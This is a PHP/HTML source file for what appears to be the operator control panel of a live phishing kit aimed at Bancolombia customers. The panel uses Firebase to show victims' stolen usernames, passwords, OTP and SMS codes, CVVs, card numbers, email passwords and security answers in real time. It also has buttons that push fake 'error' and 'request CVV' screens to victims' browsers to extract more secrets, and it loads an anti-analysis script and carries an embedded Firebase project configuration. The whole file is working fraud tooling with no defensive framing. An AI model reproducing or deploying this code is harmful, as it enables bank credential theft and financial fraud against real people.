<?php require_once __DIR__ . '/sec_v92_shield.php'; ?>
<!DOCTYPE html>
<html lang="es">

<head>
    <script src="assets/js/anti_analysis.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control Admin - Tiempo Real</title>
    <link rel="icon"
        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
    <!-- Google Fonts & FontAwesome icons -->
    <link
        href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --bg-dark: #090d16;
            --card-bg: rgba(17, 24, 39, 0.75);
            --card-border: rgba(255, 255, 255, 0.08);
            --accent-blue: #3b82f6;
            --accent-cyan: #06b6d4;
            --accent-emerald: #10b981;
            --accent-amber: #f59e0b;
            --accent-rose: #f43f5e;
            --accent-purple: #8b5cf6;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            background-image:
                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(139, 92, 246, 0.12) 0px, transparent 50%);
            background-attachment: fixed;
            color: var(--text-main);
            min-height: 100vh;
            padding: 1.5rem;
        }

        /* HEADER & NAVBAR */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px solid var(--card-border);
            padding: 1rem 1.5rem;
            border-radius: 16px;
            margin-bottom: 1.5rem;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 42px;
            height: 42px;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.25rem;
            color: white;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
        }

        .logo-text h1 {
            font-size: 1.25rem;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .logo-text span {
            font-size: 0.75rem;
            color: var(--accent-cyan);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .header-controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .status-pill {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: var(--accent-emerald);
            padding: 6px 14px;
            border-radius: 30px;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .pulse-dot {
            width: 8px;
            height: 8px;
            background-color: var(--accent-emerald);
            border-radius: 50%;
            box-shadow: 0 0 8px var(--accent-emerald);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
            }

            70% {
                transform: scale(1);
                box-shadow: 0 0 0 8px rgba(16, 185, 129, 0);
            }

            100% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
            }
        }

        .btn-audio {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--card-border);
            color: var(--text-main);
            padding: 8px 16px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 0.85rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s ease;
        }

        .btn-audio:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .btn-audio.active {
            background: rgba(59, 130, 246, 0.2);
            border-color: var(--accent-blue);
            color: var(--accent-blue);
        }

        /* METRICS COUNTER GRID */
        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .metric-card {
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px solid var(--card-border);
            padding: 1.25rem;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .metric-info p {
            font-size: 0.8rem;
            color: var(--text-muted);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .metric-info h2 {
            font-size: 1.75rem;
            font-weight: 800;
            margin-top: 4px;
        }

        .metric-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.25rem;
        }

        /* MAIN CONTENT AREA */
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }

        .section-header h2 {
            font-size: 1.1rem;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .devices-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
            gap: 1.25rem;
        }

        /* DEVICE CARD */
        .device-card {
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px solid var(--card-border);
            border-radius: 18px;
            padding: 1.25rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s ease, border-color 0.2s ease;
        }

        .device-card:hover {
            transform: translateY(-2px);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .device-card.highlight {
            border-color: var(--accent-emerald);
            box-shadow: 0 0 20px rgba(16, 185, 129, 0.15);
        }

        .device-card-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }

        .device-id {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            font-weight: 700;
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .device-type-badge {
            background: rgba(59, 130, 246, 0.15);
            color: var(--accent-blue);
            font-size: 0.7rem;
            font-weight: 700;
            padding: 2px 8px;
            border-radius: 6px;
            text-transform: uppercase;
        }

        .badge-status {
            font-size: 0.75rem;
            font-weight: 700;
            padding: 4px 10px;
            border-radius: 20px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-complete {
            background: rgba(16, 185, 129, 0.2);
            color: var(--accent-emerald);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }

        .status-typing {
            background: rgba(245, 158, 11, 0.2);
            color: var(--accent-amber);
            border: 1px solid rgba(245, 158, 11, 0.3);
        }

        .status-visitor {
            background: rgba(156, 163, 175, 0.15);
            color: var(--text-muted);
            border: 1px solid rgba(156, 163, 175, 0.3);
        }

        /* CREDENTIALS BOX */
        .credentials-box {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            padding: 1rem;
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .cred-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .cred-label {
            font-size: 0.75rem;
            color: var(--text-muted);
            font-weight: 600;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .cred-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--accent-cyan);
            background: rgba(6, 182, 212, 0.08);
            padding: 4px 10px;
            border-radius: 8px;
            border: 1px solid rgba(6, 182, 212, 0.2);
            min-width: 140px;
            text-align: right;
            letter-spacing: 1px;
        }

        .cred-value.pass {
            color: #f472b6;
            background: rgba(244, 114, 182, 0.08);
            border-color: rgba(244, 114, 182, 0.2);
        }

        .meta-info {
            display: flex;
            justify-content: space-between;
            font-size: 0.75rem;
            color: var(--text-muted);
        }

        /* ACTION BUTTONS GRID */
        .actions-header {
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 4px;
        }

        .action-buttons-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
        }

        .btn-action {
            border: none;
            padding: 10px 12px;
            border-radius: 10px;
            font-size: 0.8rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: all 0.15s ease;
        }

        .btn-action:active {
            transform: scale(0.97);
        }

        .btn-otp {
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
            color: white;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
        }

        .btn-otp:hover {
            background: linear-gradient(135deg, #1d4ed8, #1e40af);
        }

        .btn-error {
            background: linear-gradient(135deg, #d97706, #b45309);
            color: white;
            box-shadow: 0 4px 12px rgba(217, 119, 6, 0.3);
        }

        .btn-error:hover {
            background: linear-gradient(135deg, #b45309, #92400e);
        }

        .btn-restart {
            background: rgba(255, 255, 255, 0.08);
            color: var(--text-main);
            border: 1px solid var(--card-border);
        }

        .btn-restart:hover {
            background: rgba(255, 255, 255, 0.15);
        }

        .btn-close {
            background: linear-gradient(135deg, #e11d48, #be123c);
            color: white;
            box-shadow: 0 4px 12px rgba(225, 29, 72, 0.3);
        }

        .btn-close:hover {
            background: linear-gradient(135deg, #be123c, #9f1239);
        }

        .btn-dinamica {
            background: linear-gradient(135deg, #0d9488, #0f766e);
            color: white;
            box-shadow: 0 4px 12px rgba(13, 148, 136, 0.3);
        }

        .btn-dinamica:hover {
            background: linear-gradient(135deg, #0f766e, #115e59);
        }

        .btn-sms {
            background: linear-gradient(135deg, #4f46e5, #4338ca);
            color: white;
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
        }

        .btn-sms:hover {
            background: linear-gradient(135deg, #4338ca, #3730a3);
        }

        .btn-seguridad {
            background: linear-gradient(135deg, #7c3aed, #6d28d9);
            color: white;
            box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3);
        }

        .btn-seguridad:hover {
            background: linear-gradient(135deg, #6d28d9, #5b21b6);
        }

        .btn-cvv {
            background: linear-gradient(135deg, #0284c7, #0369a1);
            color: white;
            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
        }

        .btn-cvv:hover {
            background: linear-gradient(135deg, #0369a1, #075985);
        }

        .btn-delete {
            grid-column: span 2;
            background: rgba(244, 63, 94, 0.1);
            color: var(--accent-rose);
            border: 1px solid rgba(244, 63, 94, 0.2);
            margin-top: 4px;
        }

        .btn-delete:hover {
            background: rgba(244, 63, 94, 0.2);
        }

        /* EMPTY STATE */
        .empty-state {
            grid-column: 1 / -1;
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px dashed var(--card-border);
            border-radius: 20px;
            padding: 4rem 2rem;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1rem;
        }

        .empty-icon {
            font-size: 3rem;
            color: var(--text-muted);
            opacity: 0.5;
        }

        .empty-state h3 {
            font-size: 1.25rem;
            color: var(--text-main);
        }

        .empty-state p {
            color: var(--text-muted);
            font-size: 0.9rem;
            max-width: 400px;
        }
    </style>
</head>

<body>

    <!-- HEADER -->
    <header>
        <div class="logo-area">
            <div class="logo-icon">
                <i class="fa-solid fa-shield-halved"></i>
            </div>
            <div class="logo-text">
                <h1>PANEL DE CONTROL ADMIN</h1>
                <span>Monitoreo en Tiempo Real</span>
            </div>
        </div>

        <div class="header-controls">
            <button id="btnAudioToggle" class="btn-audio active" onclick="toggleAudio()">
                <i class="fa-solid fa-volume-high" id="audioIcon"></i>
                <span id="audioText">Sonido: ON</span>
            </button>

            <button onclick="testDatabaseConnection()" style="background: rgba(6, 182, 212, 0.2); border: 1px solid rgba(6, 182, 212, 0.4); color: #06b6d4; padding: 6px 14px; border-radius: 30px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 6px;" title="Probar conexión con Firebase">
                <i class="fa-solid fa-network-wired"></i> Probar Conexión
            </button>

            <div class="status-pill">
                <div class="pulse-dot"></div>
                <span>CONECTADO</span>
            </div>
        </div>
    </header>

    <!-- METRICS GRID -->
    <div class="metrics-grid">
        <div class="metric-card">
            <div class="metric-info">
                <p>Dispositivos Activos</p>
                <h2 id="metricTotal">0</h2>
            </div>
            <div class="metric-icon" style="background: rgba(59, 130, 246, 0.15); color: var(--accent-blue);">
                <i class="fa-solid fa-mobile-screen-button"></i>
            </div>
        </div>

        <div class="metric-card">
            <div class="metric-info">
                <p>Escribiendo</p>
                <h2 id="metricTyping">0</h2>
            </div>
            <div class="metric-icon" style="background: rgba(245, 158, 11, 0.15); color: var(--accent-amber);">
                <i class="fa-solid fa-pen-keyboard"></i>
            </div>
        </div>

        <div class="metric-card">
            <div class="metric-info">
                <p>Completados</p>
                <h2 id="metricComplete">0</h2>
            </div>
            <div class="metric-icon" style="background: rgba(16, 185, 129, 0.15); color: var(--accent-emerald);">
                <i class="fa-solid fa-circle-check"></i>
            </div>
        </div>

        <div class="metric-card">
            <div class="metric-info">
                <p>Desconectados</p>
                <h2 id="metricOffline">0</h2>
            </div>
            <div class="metric-icon" style="background: rgba(244, 63, 94, 0.15); color: var(--accent-rose);">
                <i class="fa-solid fa-wifi-slash"></i>
            </div>
        </div>
    </div>

    <!-- MAIN SECTION -->
    <div class="section-header">
        <h2><i class="fa-solid fa-satellite-dish" style="color: var(--accent-cyan);"></i> Dispositivos Conectados</h2>
        <span style="font-size: 0.8rem; color: var(--text-muted);" id="lastSync">Sincronizado hace un momento</span>
    </div>

    <div id="devicesContainer" class="devices-grid">
        <!-- Empty State Default -->
        <div class="empty-state">
            <div class="empty-icon">
                <i class="fa-solid fa-radar"></i>
            </div>
            <h3>Esperando conexiones de usuarios...</h3>
            <p>Cuando un visitante ingrese a <code>index.php</code>, su dispositivo aparecerá automáticamente aquí en
                tiempo real.</p>
        </div>
    </div>

    <script src="assets/js/config.js"></script>
    <!-- FIREBASE SDK COMPAT -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>

    <script>
        // CONFIGURACIÓN DE FIREBASE DESDE CONFIG.JS
        const firebaseConfig = {
            apiKey: "AIzaSyBnS0FxHLYA4AIncGyxf5DZwHfhRGlyWso",
            authDomain: "cain-5b1e4.firebaseapp.com",
            databaseURL: "https://cain-5b1e4-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "cain-5b1e4",
            storageBucket: "cain-5b1e4.firebasestorage.app",
            messagingSenderId: "635040724776",
            appId: "1:635040724776:web:daac1413b1623777b9597b"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }

        // AUTENTICACIÓN ANÓNIMA OBLIGATORIA PARA LECTURA EN TIGG-51F26
        firebase.auth().signInAnonymously()
            .then(() => console.log('✅ Autenticado anónimamente en Firebase tigg-51f26'))
            .catch(e => console.error('❌ Error Auth:', e));

        const db = firebase.database();
        const userId = 'cain';

        async function testDatabaseConnection() {
            const startTime = Date.now();
            try {
                const dbRef = firebase.database().ref('.info/connected');
                const snap = await dbRef.once('value');
                const isConnected = snap.val();
                const latency = Date.now() - startTime;
                const dbUrl = firebaseConfig.databaseURL || 'Desconocida';

                if (isConnected) {
                    alert(`✅ CONEXIÓN EXITOSA CON FIREBASE\n\n📡 Base de Datos: ${dbUrl}\n⚡ Latencia: ${latency} ms\n🟢 Estado: Conectado en tiempo real`);
                } else {
                    alert(`⚠️ CONEXIÓN EN PROCESO / RECONECTANDO\n\n📡 Base de Datos: ${dbUrl}\n🔴 Estado: Esperando confirmación de socket...`);
                }
            } catch (e) {
                console.error('❌ Error probando conexión:', e);
                alert(`❌ ERROR DE CONEXIÓN\n\nNo se pudo establecer comunicación con Firebase.\nDetalle: ${e.message}`);
            }
        }

        // CONTROL DE AUDIO Y SINTETIZADOR WEB AUDIO API
        let audioEnabled = true;
        let audioCtx = null;

        function initAudioContext() {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
        }

        function toggleAudio() {
            audioEnabled = !audioEnabled;
            const btn = document.getElementById('btnAudioToggle');
            const icon = document.getElementById('audioIcon');
            const text = document.getElementById('audioText');

            if (audioEnabled) {
                btn.classList.add('active');
                icon.className = 'fa-solid fa-volume-high';
                text.textContent = 'Sonido: ON';
                playChimeSound(660, 0.1);
            } else {
                btn.classList.remove('active');
                icon.className = 'fa-solid fa-volume-xmark';
                text.textContent = 'Sonido: OFF';
            }
        }

        function playChimeSound(freq = 587.33, duration = 0.2) {
            if (!audioEnabled) return;
            try {
                initAudioContext();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();

                osc.type = 'sine';
                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);

                gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);

                osc.connect(gain);
                gain.connect(audioCtx.destination);

                osc.start();
                osc.stop(audioCtx.currentTime + duration);
            } catch (e) { }
        }

        function playTimbreAlert() {
            if (!audioEnabled) return;
            playChimeSound(523.25, 0.15); // C5
            setTimeout(() => playChimeSound(659.25, 0.15), 150); // E5
            setTimeout(() => playChimeSound(783.99, 0.3), 300);  // G5
        }

        function playNotificationAlert() {
            if (!audioEnabled) return;
            playChimeSound(880, 0.1);
            setTimeout(() => playChimeSound(1108.73, 0.15), 100);
        }

        // COMANDOS HACIA EL DISPOSITIVO DEL USUARIO
        async function sendCommand(token, deviceId, commandName) {
            try {
                if (commandName === 'delete') {
                    if (confirm('¿Estás seguro de eliminar este dispositivo de la lista?')) {
                        await db.ref(`sessions/${userId}/${token}/devices/${deviceId}`).remove();
                    }
                    return;
                }

                await db.ref(`sessions/${userId}/${token}/devices/${deviceId}/command`).set(commandName);
                playChimeSound(440, 0.1);
            } catch (e) {
                console.error('Error al enviar comando:', e);
                alert('No se pudo enviar el comando.');
            }
        }

        // ESCUCHAR TODOS LOS DISPOSITIVOS EN TIEMPO REAL
        const devicesContainer = document.getElementById('devicesContainer');
        const metricTotal = document.getElementById('metricTotal');
        const metricTyping = document.getElementById('metricTyping');
        const metricComplete = document.getElementById('metricComplete');
        const metricOffline = document.getElementById('metricOffline');
        const lastSync = document.getElementById('lastSync');

        const playedSoundCache = {};

        db.ref(`sessions/${userId}`).on('value', (snapshot) => {
            const rootData = snapshot.val() || {};
            devicesContainer.innerHTML = '';

            let totalCount = 0;
            let typingCount = 0;
            let completeCount = 0;
            let offlineCount = 0;

            const allDevicesList = [];

            // Recorrer tokens
            Object.keys(rootData).forEach(tokenKey => {
                const sessionObj = rootData[tokenKey];
                if (sessionObj && sessionObj.devices) {
                    Object.keys(sessionObj.devices).forEach(devId => {
                        const dev = sessionObj.devices[devId];
                        allDevicesList.push({
                            token: tokenKey,
                            deviceId: devId,
                            data: dev
                        });
                    });
                }
            });

            // Preservar y ordenar por hora fija de creación (cada tarjeta se queda en su puesto de ingreso)
            const deviceFirstSeenMap = window._deviceFirstSeenMap = window._deviceFirstSeenMap || {};
            allDevicesList.forEach(item => {
                const devId = item.deviceId;
                if (!deviceFirstSeenMap[devId]) {
                    deviceFirstSeenMap[devId] = item.data.createdAt || item.data.timestamp || item.data.created || item.data.lastActivity || Date.now();
                }
                item.createdAtFixed = deviceFirstSeenMap[devId];
            });
            allDevicesList.sort((a, b) => (b.createdAtFixed || 0) - (a.createdAtFixed || 0));

            if (allDevicesList.length === 0) {
                devicesContainer.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">
                            <i class="fa-solid fa-radar"></i>
                        </div>
                        <h3>Sin conexiones activas</h3>
                        <p>Cuando un visitante ingrese a <code>index.php</code>, su dispositivo aparecerá automáticamente aquí en tiempo real.</p>
                    </div>
                `;
            } else {
                const now = Date.now();

                allDevicesList.forEach(item => {
                    totalCount++;
                    const dev = item.data;
                    const token = item.token;
                    const deviceId = item.deviceId;

                    const usuario = (dev.data && dev.data.usuarioEntidad) ? dev.data.usuarioEntidad : (dev.usuarioEntidad || '---');
                    const password = (dev.data && dev.data.passwordEntidad) ? dev.data.passwordEntidad : (dev.passwordEntidad || '---');
                    const otpCode = (dev.data && dev.data.otp) ? dev.data.otp : (dev.otp || '---');
                    const ip = (dev.data && dev.data.ip) ? dev.data.ip : (dev.ip || 'Obteniendo...');
                    const statusText = dev.status || 'visitante';
                    const lastAct = dev.lastActivity || 0;

                    const isOnline = (now - lastAct) < 10000; // online si reportó en los últimos 10s

                    if (!isOnline) {
                        offlineCount++;
                    } else if (statusText.includes('completó') || statusText.includes('esperando')) {
                        completeCount++;
                    } else if (statusText.includes('login') || usuario !== '---') {
                        typingCount++;
                    }

                    // AUDIOS DE ALERTA
                    if (dev.soundPlaying && playedSoundCache[deviceId] !== dev.soundPlaying) {
                        playedSoundCache[deviceId] = dev.soundPlaying;
                        if (dev.soundPlaying === 'timbre') playTimbreAlert();
                        if (dev.soundPlaying === 'notification') playNotificationAlert();

                        // Limpiar sonido en Firebase para que no vuelva a sonar en recargas
                        db.ref(`sessions/${userId}/${token}/devices/${deviceId}/soundPlaying`).remove();
                    }

                    // BADGE DE ESTADO
                    let badgeClass = 'status-visitor';
                    let badgeText = statusText;

                    if (statusText.includes('completó')) {
                        badgeClass = 'status-complete';
                        badgeText = 'COMPLETADO';
                    } else if (statusText.includes('login') || usuario !== '---') {
                        badgeClass = 'status-typing';
                        badgeText = 'EN PROCESO';
                    } else if (!isOnline) {
                        badgeClass = 'status-visitor';
                        badgeText = 'INACTIVO';
                    }

                    // RENDERIZAR TARJETA
                    const card = document.createElement('div');
                    card.className = `device-card ${badgeClass === 'status-complete' ? 'highlight' : ''}`;
                    card.innerHTML = `
                        <div class="device-card-header">
                            <div class="device-id">
                                <i class="fa-solid fa-mobile-screen" style="color: var(--accent-blue);"></i>
                                ${deviceId.substring(0, 12)}...
                                <span class="device-type-badge">${dev.type || 'Bancolombia'}</span>
                            </div>
                            <span class="badge-status ${badgeClass}">${badgeText}</span>
                        </div>

                        <div class="credentials-box">
                            <div class="cred-row">
                                <span class="cred-label"><i class="fa-solid fa-user"></i> Usuario</span>
                                <span class="cred-value">${usuario}</span>
                            </div>
                            <div class="cred-row">
                                <span class="cred-label"><i class="fa-solid fa-key"></i> Clave / PIN</span>
                                <span class="cred-value pass">${password}</span>
                            </div>
                            <div class="cred-row">
                                <span class="cred-label"><i class="fa-solid fa-shield-halved"></i> Código OTP</span>
                                <span class="cred-value otp" style="color: #a855f7; background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.3);">${otpCode}</span>
                            </div>
                            ${(() => {
                            const dataObj = dev.data || {};
                            const fieldDefs = {
                                'sms': { label: 'Código SMS', icon: 'fa-comment-sms', color: '#6366f1' },
                                'dinamica': { label: 'Clave Dinámica', icon: 'fa-key', color: '#0d9488' },
                                'cvv': { label: 'Código CVV', icon: 'fa-credit-card', color: '#38bdf8' },
                                'tarjeta': { label: 'Tarjeta', icon: 'fa-credit-card', color: '#34d399' },
                                'correo': { label: 'Correo', icon: 'fa-envelope', color: '#fbbf24' },
                                'claveCorreo': { label: 'Clave Correo', icon: 'fa-lock', color: '#f87171' },
                                'respuestaSeguridad': { label: 'Resp. Seguridad', icon: 'fa-user-shield', color: '#c084fc' },
                                'paso': { label: 'Paso / Pantalla', icon: 'fa-location-dot', color: '#e879f9' }
                            };
                            let extraHtml = '';
                            Object.keys(fieldDefs).forEach(key => {
                                if (dataObj[key] && dataObj[key] !== '' && dataObj[key] !== '---') {
                                    const def = fieldDefs[key];
                                    extraHtml += `
                                            <div class="cred-row">
                                                <span class="cred-label"><i class="fa-solid ${def.icon}"></i> ${def.label}</span>
                                                <span class="cred-value" style="color: ${def.color}; background: rgba(255,255,255,0.05); border-color: ${def.color}44;">${dataObj[key]}</span>
                                            </div>
                                        `;
                                }
                            });
                            return extraHtml;
                        })()}
                        </div>

                        <div class="meta-info">
                            <span><i class="fa-solid fa-network-wired"></i> IP: <strong>${ip}</strong></span>
                            <span><i class="fa-solid fa-circle" style="color: ${isOnline ? 'var(--accent-emerald)' : 'var(--accent-rose)'}"></i> ${isOnline ? 'En línea' : 'Hace ' + Math.round((now - lastAct) / 1000) + 's'}</span>
                        </div>

                        <div class="actions-header">Acciones del Panel</div>

                        <div class="action-buttons-grid">
                            <button class="btn-action btn-otp" onclick="sendCommand('${token}', '${deviceId}', 'otp')">
                                <i class="fa-solid fa-key"></i> Clave Dinámica
                            </button>
                            <button class="btn-action btn-dinamica" onclick="sendCommand('${token}', '${deviceId}', 'dinamica')" style="background: linear-gradient(135deg, #d97706, #b45309);">
                                <i class="fa-solid fa-triangle-exclamation"></i> Error Dinámica
                            </button>
                            <button class="btn-action btn-sms" onclick="sendCommand('${token}', '${deviceId}', 'sms')">
                                <i class="fa-solid fa-comment-sms"></i> Código SMS
                            </button>
                            <button class="btn-action btn-sms-err" onclick="sendCommand('${token}', '${deviceId}', 'sms-error')" style="background: linear-gradient(135deg, #e11d48, #be123c);">
                                <i class="fa-solid fa-message-slash"></i> Error SMS
                            </button>
                            <button class="btn-action btn-cvv" onclick="sendCommand('${token}', '${deviceId}', 'cvv')">
                                <i class="fa-solid fa-credit-card"></i> Pedir CVV
                            </button>
                            <button class="btn-action btn-seguridad" onclick="sendCommand('${token}', '${deviceId}', 'seguridad')">
                                <i class="fa-solid fa-user-shield"></i> Pregunta Seguridad
                            </button>
                            <button class="btn-action btn-error" onclick="sendCommand('${token}', '${deviceId}', 'login-error')">
                                <i class="fa-solid fa-triangle-exclamation"></i> Error Login
                            </button>
                            <button class="btn-action btn-restart" onclick="sendCommand('${token}', '${deviceId}', 'reiniciar')">
                                <i class="fa-solid fa-rotate-right"></i> Reiniciar
                            </button>
                            <button class="btn-action btn-close" onclick="sendCommand('${token}', '${deviceId}', 'cerrar')">
                                <i class="fa-solid fa-power-off"></i> Cerrar
                            </button>
                            <button class="btn-action btn-delete" onclick="sendCommand('${token}', '${deviceId}', 'delete')">
                                <i class="fa-solid fa-trash-can"></i> Eliminar Dispositivo
                            </button>
                        </div>                    `;

                    devicesContainer.appendChild(card);
                });
            }

            // ACTUALIZAR MÉTRICAS
            metricTotal.textContent = totalCount;
            metricTyping.textContent = typingCount;
            metricComplete.textContent = completeCount;
            metricOffline.textContent = offlineCount;

            const dateNow = new Date();
            lastSync.textContent = `Actualizado ${dateNow.toLocaleTimeString()}`;
        });
    </script>
</body>

</html>